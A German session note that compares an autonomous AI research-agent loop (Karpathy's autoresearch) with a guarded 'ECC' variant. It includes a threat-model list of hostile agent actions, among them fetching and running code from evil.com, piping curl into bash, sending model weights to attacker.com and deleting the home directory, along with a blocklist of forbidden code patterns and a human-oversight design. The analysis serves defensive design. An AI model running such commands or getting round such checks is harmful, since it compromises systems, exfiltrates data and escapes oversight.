---
date: 2026-04-08
time: 01:25
type: session
title: Session 2026-03-31-autoresearch-comparison-karpathy-vs-ecc
category: project
tags:
  - autoresearch
  - ecc
  - architecture
  - research
  - coding
  - project
  - session
related_notes:
  - 📝 [[2026-03-31-autoresearch-comparison-karpathy-vs-ecc]] (85 gemeinsame Begriffe: vergleich, karpathy, autoresearch)
  - 📝 [[2026-03-31-autoresearch-ecc-masterplan]] (32 gemeinsame Begriffe: autoresearch, ecc, datum)
  - 📦 [[6.0 GitHub-Analyse & Obsidian RAG]] (24 gemeinsame Begriffe: github, der, ist)
related_count: 5
session_id: 2026-04-08-0125
agent: andrew-main
user: parzival
status: active
source_file: 2026-03-31-autoresearch-comparison-karpathy-vs-ecc.md
decisions: none
todos: none
code_blocks: 11
---

# Session 2026-03-31-autoresearch-comparison-karpathy-vs-ecc

## Zusammenfassung
**Datum:** 2026-03-31  
**Vergleichsgrundlage:**
- **Original:** https://github.com/karpathy/autoresearch (program.md)
- **ECC-Version:** skills/ecc-autoresearch/SKILL.md

## Code-Blöcke

### markdown
```markdown
## Theoretisch mögliche Aktionen (ohne Einschränkung)

1. Agent könnte einbauen:
   eval(requests.get("http://evil.com/payload").text)
   
2. Agent könnte ausführen:
   os.system("curl http://evil.com | bash")
   
3. Agent könnte senden:
   requests.post("http://attacker.com", data=model_weights)
   
4. Agent könnte löschen:
   shutil.rmtree("~/")
```

### python
```python
# Forbidden Patterns (werden blockiert):
FORBIDDEN_PATTERNS = [
    r'eval\s*\(',           # Kein eval()
    r'exec\s*\(',           # Kein exec()
    r'__import__\s*\(',     # Kein dynamischer Import
    r'subprocess',          # Keine Subprocess
    r'os\.system',          # Kein Shell-Zugriff
    r'requests\.(get|post)', # Kein HTTP (außer Whitelist)
    r'socket\.',            # Keine Sockets
]

# AST-Check: Verhindert selbst kreative Umgehungen
# Resource-Guard: Killt bei 10min / 50GB
# Au
...
```

### text
```text
┌─────────────────────────────────────────┐
│           KARPATHY LOOP                 │
│                                         │
│  1. Analyze → 2. Hypothesis → 3. Code   │
│                                         │
│  4. Commit → 5. Execute → 6. Results    │
│                                         │
│  [Keep/Discard] → REPEAT FOREVER        │
│                                         │
│  💤 Mensch schläft, Agent arbeitet      │
│  🚫 Keine Unterbrechung                 │
│  ⚡ Maximum Spe
...
```

### text
```text
┌─────────────────────────────────────────┐
│            ECC LOOP                     │
│                                         │
│  1. Analyze → 2. Hypothesis → 🔒 SAFETY │
│                                         │
│  CHECK → 3. Code → 4. Commit → 5. Exec  │
│                                         │
│  [Resource Guard] → 6. Results          │
│                                         │
│  [Keep/Discard] → 📝 Obsidian Sync      │
│                                         │
│  🔔 Human Noti
...
```

### python
```python
# Agent schreibt:
eval(some_variable)  # ⚠️ Wird ausgeführt!

# Ergebnis:
# - Code läuft
# - val_bpb schlecht → discard
# - Aber: Schaden könnte bereits passiert sein
```

---

## Original

```
# Vergleich: Karpathy's autoresearch vs. ECC-Autoresearch

**Datum:** 2026-03-31  
**Vergleichsgrundlage:**
- **Original:** https://github.com/karpathy/autoresearch (program.md)
- **ECC-Version:** skills/ecc-autoresearch/SKILL.md

---

## 🎯 Philosophie-Vergleich

### Karpathy's Version
> "NEVER STOP: Once the experiment loop has begun, do NOT pause to ask the human if you should continue."

**Mentalität:**
- 🚀 **Speed über alles** - Mensch schläft, Agent forscht
- 🎲 **High Risk, High Reward** - Agent hat volle Kontrolle
- 🤖 **Reines Autonomie-Paradigma** - Kein menschlicher Eingriff erwünscht

**Implizite Annahme:**
> "Der Agent ist intelligent genug, um nichts Dummes zu tun."

---

### ECC-Version
> "Trust but verify. Automate but monitor."

**Mentalität:**
- 🛡️ **Safety First** - Autonomie mit Guardrails
- ⚖️ **Balanciert** - Agent arbeitet, Mensch überwacht
- 🤝 **Kooperativ** - Human-in-Loop bei kritischen Punkten

**Implizite Annahme:**
> "Der Agent ist mächtig, aber Fehler k
... (truncated)
```